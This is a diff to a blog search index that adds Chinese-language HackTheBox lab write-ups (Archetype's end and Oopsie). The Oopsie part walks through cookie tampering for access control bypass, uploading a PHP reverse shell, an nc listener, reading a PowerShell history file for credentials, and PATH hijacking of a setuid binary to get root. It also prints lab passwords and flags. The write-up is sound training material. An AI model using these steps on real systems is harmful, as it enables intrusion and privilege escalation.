@@ -5649,7 +5649,24 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type user.txt</span><br><span class="line"></span><br><span class="line">flag:3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrrtz323j31iv0u07a9.jpg" alt="image-20210617043318711"></p>
-<p>成功。</p>
+<p>成功。但是系统提示，还有一个flag没有找到，查看了下官方的WriteUP。</p>
+<h3 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h3><p>使用如下命令查看 powershell 历史信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grn49b1t8jj30zw06sgng.jpg" alt="image-20210619050621864"></p>
+<p>发现了高权限的账户和密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">账号：administrator</span><br><span class="line">密码：MEGACORP_4dm1n!!</span><br></pre></td></tr></table></figure>
+
+<p>使用Impacket网络协议工具包中的 psexec.py 脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py administrator@10.10.10.27</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grn49a46dpj31020g8430.jpg" alt="image-20210619051031571"></p>
+<p>最后在administrator的桌面找到root.txt</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grn49bnk9gj310e0nswl6.jpg" alt="image-20210619051431472"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: b91ccec3305e98240082d4474b848528</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grn49aipwgj60u80u0q7b02.jpg" alt="image-20210619051634141"></p>
 ]]></content>
       <categories>
         <category>HackTheBox</category>
@@ -5694,5 +5711,160 @@
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrykgafdj31360fo0uc.jpg" alt="image-20210222011157073"></p>
 <p>以上几种均可查看Service Worker是否注册成功</p>
 <h3 id="Service-Worker-XSS-利用"><a href="#Service-Worker-XSS-利用" class="headerlink" title="Service Worker XSS 利用"></a>Service Worker XSS 利用</h3>]]></content>
+  </entry>
+  <entry>
+    <title>HackTheBox-Oopsie-2</title>
+    <url>/2021/06/19/HackTheBox-Oopsie-2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grn4ez6ytsj30u0190tgr.jpg" alt=""></p>
+<a id="more"></a>
+
+<h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>Kali Linux 使用 openvpn 连接hackthebox提供的VPN</p>
+<p>加入 Oopsie 机器</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623929378643-7e6bfea6-05ff-4c31-9aa6-d181242e8459.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><p>已知靶机 IP 10.10.10.28，使用nmap扫描主机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -T4 -sV 10.10.10.28</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623929614434-aeca84b1-6cb8-43ab-b998-7045890598ae.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png">发现开放80端口和22端口，这说明是有web网站</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623931413715-adfe5f71-3347-4923-b402-7ee404d2d452.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>但是这个CMS网上没有搜索到，可扫描一波目录看看有没有啥敏感信息。爆密码没爆出来，尝试SQL注入也没成功。看了下官方的 WriteUP 密码是上个靶机爆出来的密码。。。。</p>
+<p>账号密码：admin/MEGACORP_4dm1n!!</p>
+<p>成功登陆。但是权限比较低</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623934572483-1e58e460-b46a-40eb-9ba2-1b748d3c2f48.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>点击 Account 可以查看我们的当前登录账户的信息</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623947999889-bd3ac671-3a01-4b69-aec8-0ce5c68d3ea5.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>抓包发现地址有id，并且 cookie 里面带有编号和用户名，以此可尝试越权。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623948043647-21f42760-6e2c-4def-855e-a57e0d25da84.png" alt="image.png"></p>
+<p>遍历 ID 即可(必须得生成1-100的 ID 导入，不能使用numbers模式)</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623948148476-ac9cc019-b339-405b-9691-8b57f8e89e38.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>命令：循环生成1-100</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in &#96;seq 1 100&#96;; do echo $i &gt;&gt;2.txt;done;</span><br></pre></td></tr></table></figure>
+
+<p>遍历出 ID 为30的高权限账户</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623948300366-2fb68580-2a73-4602-a88e-892e00f8a51a.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>将包中的 ID、user、role 修改</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623948429697-22ab6ea5-776b-46ad-994c-c2a2e6b650c3.png" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623948436512-6539714c-9d55-4da2-8274-de65bf475003.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>放包后即可查看到 super admin 信息，同理在uploads也修改一波，上传点就出来了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623948731274-5ab0048b-12ec-4ded-8828-17ebec5b490b.png" alt="WX20210618-005159@2x.png"></p>
+<p>上传一个kali 自带的webshell反弹马(冰蝎马上了，但是连接不上，不知道为何)，上传的时候也要修改一下 user 和 role</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php ~&#x2F;桌面   #记得修改一下IP和端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623953178620-ed7deb35-0d57-43e7-847b-2747afd6e9ab.png" alt="image.png"></p>
+<p>但是并没有返回上传的路径，此时可尝试目录遍历一波。</p>
+<p>使用dirsearch</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http:&#x2F;&#x2F;10.10.10.28 -e php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623953042324-0eace9b1-017f-4c9f-869a-ee58e5405707.png" alt="image.png"></p>
+<p>大致猜测到上传的文件在uploads。</p>
+<p>首先监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234   # 监听</span><br><span class="line"> curl http:&#x2F;&#x2F;10.10.10.28&#x2F;uploads&#x2F;1.php  #访问即可反弹</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623953552200-31e8f7cd-dc68-4ca7-ad6e-609f1efcdc76.png" alt="image.png">成功！</p>
+<p>后续在查看网站根目录下发现一个db.php，里面有数据库的账户和密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623953743223-d561b5c8-cee6-49b5-a8b0-711959990b34.png" alt="image.png"></p>
+<p>但是由于没有开放3306端口，所以没办法连接数据库查看东西，但可尝试一下是否能登录这个用户。</p>
+<p>提示这个交互shell不完整，无法使用su命令</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623953879046-02ce5ee0-726d-4a1e-9721-f892e12b0b09.png" alt="image.png"></p>
+<p>使用python去获取一个完整的交互shell，但是报错。。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623953976539-67300b33-330b-4240-97ff-ccbfd14dfd08.png" alt="image.png"></p>
+<p>看了下WriteUP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null         &#x2F;&#x2F;见注解1</span><br><span class="line">Ctrl-Z                                                                  &#x2F;&#x2F;见注解2</span><br><span class="line">stty raw -echo                                                  &#x2F;&#x2F;见注解3</span><br><span class="line">fg                                                                          &#x2F;&#x2F;见注解4</span><br><span class="line">reset                                                                       &#x2F;&#x2F;见注解5</span><br><span class="line">xterm                                                                       &#x2F;&#x2F;见注解6</span><br></pre></td></tr></table></figure>
+
+<p>1、在环境变量下将shell设置为/bin/bash且参数为  -q 和 /dev/null 的情况下运行脚本。</p>
+<ul>
+<li><ul>
+<li>-q 参数为静默运行，输出到 /dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，</li>
+<li>shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容。</li>
+</ul>
+</li>
+</ul>
+<p>2、将netcat暂挂至后台</p>
+<p>3、将本地终端置于原始模式，以免干扰远程终端</p>
+<p>4、将netcat返回到前台，注意：这里不会显示输入的命令</p>
+<p>5、重置远程终端，经测试也可以不进行此操作</p>
+<p>6、运行xterm</p>
+<p>就是跟着上面命令一顿操作猛如虎。最后直接反弹回了一个正常的交互shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623954548979-27205ff6-18db-4074-a01f-435e74b39679.png" alt="image.png"></p>
+<p>成功登录到了robert用户</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623954615713-2f542672-6acd-4f51-9e98-df5ea7dcb808.png" alt="image.png"></p>
+<p>切换到rebert家目录时，发现有个user.txt文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623954700647-d4d0fcc2-bda1-4167-aeae-2577656a40d6.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag：f2c74ee8db7983851ab2a96a44eb7981</span><br></pre></td></tr></table></figure>
+
+<p>虽然成功提交flag。但是提示我flag并不完整。。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623954822373-04863a6b-7136-4616-b251-1ec2dffc58e8.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>看来还是需要提权一波。</p>
+<h1 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h1><p>使用id查看当前的用户所属信息时，发现一个不一般的东西</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623955019570-68cbf000-d231-46ac-9c40-41ec75d80493.png" alt="image.png">有个1001，属于bugtracker组<br>如下命令是查看bugtracker组是否存在特殊访问权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -group bugtracker 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>type f 为查找普通文档</li>
+<li>group bugtracker 限定查找的组为bugtracker。</li>
+<li>2&gt;/dev/null 将错误输出到黑洞（不显示）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -al &#x2F;usr&#x2F;bin&#x2F;bugtracker</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>al 以长格式方式显示并且显示隐藏文件</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623955362022-195ce56f-7a3f-4e35-b106-3a2f7a47b8a6.png" alt="image.png"></p>
+<p>文件权限，一般是由d xxx xxx xxx 组成，三组XXX 分别代表如下。</p>
+<ul>
+<li>U：User</li>
+<li>G：Group</li>
+<li>O：Other</li>
+</ul>
+<p>三个xxx分别如下：</p>
+<ul>
+<li>r：read（读）</li>
+<li>w：write（写）</li>
+<li>x：execute （执行）</li>
+</ul>
+<p>而上图中的bugtracker里面有个s说明是特殊用户组。s(setuid 特殊权限)</p>
+<p>当运行/usr/bin/bugtracker 时，发现是根据 id 读取内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623955844030-ba4efdb8-a989-4551-acc8-fc196efdc0f7.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>id = 1001，无任何内容输出</p>
+<p>id = 1 , 输出bug内容</p>
+<p>使用 strings 可查看该文件是怎么运行的 </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623956139329-ef6f8397-ba87-48c0-b7d8-afc6fd1802f7.png" alt="image.png"></p>
+<p>发现有使用 cat 命令可查看 root 文件下的 reports 文件夹</p>
+<p>1、bugtracker 调用系统中的 cat 命令输出了位于 /root/reports/ 目录下的 bug 报告，robert 用户本应无权访问 /root 目录，而bugtracker 设置了 setuid 后就拥有了 /root 目录的访问，就拥有了root 权限</p>
+<p>2、 cat 命令是使用绝对路径而不是相对路径来调用的，即在当前用户的环境变量指定的路径中搜寻 cat 命令，可以考虑创建一个恶意的 cat命令，并修改当前用户环境变量，将权限提升为 root </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH              &#x2F;&#x2F;将&#x2F;tmp目录设置为环境变量</span><br><span class="line">cd &#x2F;tmp&#x2F;                                    &#x2F;&#x2F;切换到&#x2F;tmp目录下</span><br><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; cat                  &#x2F;&#x2F;在此构造恶意的cat命令</span><br><span class="line">chmod +x cat                              &#x2F;&#x2F;赋予执行权限</span><br></pre></td></tr></table></figure>
+
+<p>当重新运行 bugtracker 时，我们调用其实是 /tmp 目录下的恶意 cat </p>
+<p>命令。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623956594666-602ceaea-74e5-4f91-9110-06a28df64453.png" alt="image.png">运行后会重新获取一个交互 shell ，属于 id 此时返回的是 root 权限。</p>
+<p>由于 cat 命令被替换，所以无法使用 cat 命令查看文件内容。。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623956829553-cbbdf397-b98f-4dbc-9eec-d5786f30d2a2.png" alt="image.png"></p>
+<p>使用 more 即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623956853004-f6f72841-fbf4-4210-a4a7-2b58b0f8ddf2.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag：af13b0bee69f8a877c3faf667f7beacf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623956936277-043beb24-31b2-4e54-98cf-3d0d25436df2.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<p>成功。。</p>
+<p>最后，在.config文件下发现了filezilla的账户和密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12776872/1623957374371-d08ce16d-1414-4030-847b-7e29d40136e6.png?x-oss-process=image%2Fresize%2Cw_1500" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;User&gt;ftpuser&lt;&#x2F;User&gt;</span><br><span class="line">&lt;Pass&gt;mc@F1l3ZilL4&lt;&#x2F;Pass&gt;</span><br></pre></td></tr></table></figure>
+
+<p>作为第三关的靶机渗透。</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>1、登录处的密码竟然是第一关爆出来的密码是我没有想到的。。</p>
+<p>2、越权的点其实不算难，但是根据里面的 user 编号替换算是第一次遇见，开拓了下思维。</p>
+<p>3、获取 交互 shell 的点算是涨见识了，只是有点概念。</p>
+<p>4、对于最后特殊权限第一次见，cat 提权方式也是第一次使用，后面还是要多多练习，拓宽眼界。</p>
+<p>虽说的简单靶机，但是学到很多东西，后续多做，争取能尝试自己做一个靶机出来。</p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/m0_48066270/article/details/108641892" target="_blank" rel="noopener">https://blog.csdn.net/m0_48066270/article/details/108641892</a></p>
+<p>还有官方的WriteUP。</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
   </entry>
 </search>
